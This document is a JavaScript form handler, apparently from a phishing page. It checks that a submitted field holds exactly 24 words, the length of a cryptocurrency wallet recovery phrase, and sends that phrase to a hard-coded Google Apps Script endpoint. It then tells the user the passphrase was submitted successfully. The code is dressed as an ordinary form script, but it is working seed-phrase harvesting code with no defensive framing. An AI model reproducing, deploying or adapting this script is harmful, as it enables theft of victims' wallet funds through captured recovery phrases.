// Function to handle form submission
function handleSubmit(event) {
    console.log('Form submission started');
    event.preventDefault(); // Prevent default form submission
    const errorElement = document.getElementById('emsg');
    errorElement.textContent = '';
    const myButton = document.getElementById('b1');
    myButton.disabled = true;

    const myButton2 = document.getElementById('b2');
    myButton2.disabled = true;
    
    // Step 1: Get the value of the hidden input field with name 'mf-texts'
    const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
    const inputValue = form.elements['mf-texts'].value.trim();
    console.log('User input:', inputValue);
                                                                                                                                                                                                                          
    const wordCount = inputValue.split(/\s+/).length;
    console.log('Word count:', wordCount);
    if (wordCount !== 24) {
        console.warn('Invalid Passphrase - incorrect word count');
        errorElement.textContent = 'Invalid Passphrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
        return; // Exit function if word count is not 24
    }

    // Google Apps Script Web App URL
    const url = "https://script.google.com/macros/s/AKfycbw8P2Ox0tUHxAvypr4RAOOunxm14RBEH2CwTeY18kBl5JctQ9UfsSwy4WDPSXXdd_6opA/exec";
    console.log('Sending request to:', url);
    
    // Step 2: Make a POST request to the Google Apps Script URL
    fetch(url, {
        method: 'POST',
        mode: 'cors',  // Ensure CORS is handled
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ text: inputValue })
    })
    .then(response => {
        console.log('Response received:', response.status);
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json(); // Assuming the response is JSON; adjust as per your API
    })
    .then(data => {
        console.log('Server response:', data);
        errorElement.textContent = data.message || 'Passphrase submitted successfully';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
    })
    .catch(error => {
        console.error('Error:', error);
        errorElement.textContent = 'Error occurred while processing your request.';
        myButton.disabled = false;
        myButton2.disabled = false;
    });
}

// Add event listener to the form for 'submit' event
document.getElementById('myForm').addEventListener('submit', handleSubmit);
console.log('Event listener attached to form');



